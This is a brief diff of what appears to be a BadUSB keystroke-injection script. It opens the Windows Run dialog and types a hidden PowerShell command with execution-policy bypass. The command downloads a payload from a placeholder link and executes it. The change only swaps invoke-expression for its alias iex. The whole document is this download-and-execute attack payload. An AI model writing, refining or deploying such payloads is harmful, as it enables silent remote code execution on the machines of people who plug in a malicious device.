@@ -12,6 +12,6 @@ GUI r
 DELAY 500
 STRING powershell -w h -NoP -NonI -Exec Bypass $pl = iwr 
 STRING DOWNLOAD_LINK
-STRING ; invoke-expression $pl
+STRING ; iex $pl
 DELAY 500
 ENTER
